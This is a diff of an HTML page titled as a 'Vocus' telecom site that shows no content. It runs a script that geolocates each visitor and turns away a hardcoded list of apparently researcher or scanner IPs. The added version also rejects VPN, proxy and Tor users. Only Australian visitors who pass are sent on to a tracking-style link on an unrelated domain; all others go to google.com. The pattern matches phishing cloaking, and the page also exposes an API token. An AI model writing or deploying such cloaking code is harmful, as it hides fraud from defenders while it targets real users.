@@ -1,15 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vocus Tech</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js" integrity="sha512-cEgdeh0IWe1pUYypx4mYPjDxGB/tyIORwjxzKrnoxcif2ZxI7fw81pZWV0lGnPWLrfIHGA7qc964MnRjyCYmEQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Vocus Comunication</title>
+  <script>
+    const allowedCountry = 'AU';
+    const token = "396ec7a7e34187";
 
-    <script>
-        const allowedCountries = ['AU']; // Only allow Australia (AU)
-
-        const blockedIPs = [
+    const blockedIPs = [
             "185.18.222.147", "103.17.196.155", "198.44.133.53", "138.199.22.183", "106.161.65.206",
             "54.200.5.221", "35.89.14.236", "104.210.79.75", "35.88.70.185", "96.0.0.81",
             "20.28.16.4", "104.28.108.0", "16.50.232.14", "173.239.194.27", "217.64.126.104",
@@ -19,44 +18,58 @@
             "212.143.94.254", "212.6.82.xxx", "40.80.158.10", "89.248.171.xxx", "85.208.139.205",
             "138.199.59.xxx", "128.90.177.209", "128.90.63.191", "74.80.181.154", "212.102.63.xxx",
             "82.102.31.156", "31.217.248.xxx", "159.148.128.163", "85.254.40.226" "173.239.203.152",
-        ];
+    ];
 
-        // دالة كتشيك واش الـIP محظور حتى بالرنج
-        function isIPBlocked(ip) {
-            return blockedIPs.some(blocked => {
-                if (blocked.includes("xxx")) {
-                    const prefix = blocked.replace(".xxx", "");
-                    return ip.startsWith(prefix);
-                } else {
-                    return ip === blocked;
-                }
-            });
+    async function checkAccess() {
+      try {
+        const ipResponse = await fetch(`https://ipinfo.io/json?token=${token}`);
+        const ipData = await ipResponse.json();
+
+        const ip = ipData.ip;
+        const country = ipData.country;
+
+        console.log("User IP:", ip);
+        console.log("Country:", country);
+
+        // Check if IP is blocked
+        const isBlocked = blockedIPs.some(blocked => {
+          if (blocked.endsWith('.xxx')) {
+            return ip.startsWith(blocked.replace('.xxx', ''));
+          } else {
+            return ip === blocked;
+          }
+        });
+
+        if (isBlocked) {
+          console.warn("Blocked IP detected:", ip);
+          window.location.href = "https://google.com";
+          return;
         }
 
-        $.get('https://ipinfo.io/json', function(data) {  
-            const ipAddress = data.ip;  
-            const country = data.country;  
+        // Check for proxy/VPN/Tor
+        const privacyResponse = await fetch(`https://ipinfo.io/${ip}/privacy?token=${token}`);
+        const privacyData = await privacyResponse.json();
 
-            console.log("IP Address:", ipAddress);  
-            console.log("Country:", country);  
+        const isProxy = privacyData.proxy;
+        const isVPN = privacyData.vpn;
+        const isTor = privacyData.tor;
 
-            if (isIPBlocked(ipAddress)) {
-                console.log("Blocked IP detected:", ipAddress);
-                window.location.replace("https://google.com");
-                return;
-            }
+        if (country === allowedCountry && !isProxy && !isVPN && !isTor) {
+          window.location.href = "https://www.sehigh.com/DZRZX6W/2151XQRW/";
+        } else {
+          window.location.href = "https://google.com";
+        }
 
-            if (allowedCountries.includes(country)) {
-                console.log("Access allowed for country:", country);    
-                window.location.replace("https://www.upsearching.com/DZRZX6W/SS8GLPH/");
-            } else {
-                console.log("Access denied for country:", country);    
-                window.location.replace("https://google.com");
-            }
-        }).fail(function(error) {  
-            console.error('Error:', error);  
-            window.location.replace("https://google.com");
-        });
-    </script>
+      } catch (error) {
+        console.error("Error:", error);
+        window.location.href = "https://google.com";
+      }
+    }
+
+    window.onload = checkAccess;
+  </script>
 </head>
+<body>
+</body>
 </html>
+
